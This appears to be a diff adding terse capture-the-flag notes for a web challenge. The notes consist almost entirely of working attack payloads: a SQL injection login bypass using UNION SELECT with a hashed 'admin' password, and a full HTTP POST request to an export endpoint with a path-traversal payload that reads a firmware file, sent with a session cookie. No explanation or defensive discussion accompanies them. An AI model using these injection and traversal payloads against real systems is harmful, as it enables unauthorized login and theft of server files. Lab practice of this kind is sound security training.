@@ -1,0 +1,19 @@
+username=1" union select 'admin','21232f297a57a5a743894a0e4a801fc3' limit 0,1-- -
+password=admin
+
+lfi:
+
+POST /api/export HTTP/1.1
+Host: 94.237.59.199:52578
+Content-Length: 87
+Accept-Language: es-ES,es;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Accept: */*
+Origin: http://94.237.59.199:52578
+Referer: http://94.237.59.199:52578/home
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE56STJPRGd4T1RZd2ZRLjUxM1N1U1NsV0pIOHlzRW41eWVFT3VjaVh1bS1vOU9NWmhoZjhjXzJBWEUifQ.Zu3MSA.OxUjmlfCkWHQGMFO-eMRGRNzywE
+Connection: keep-alive
+
+{"name":"....//....//....//....//....//....//....//....//....//signal_sleuth_firmware"}
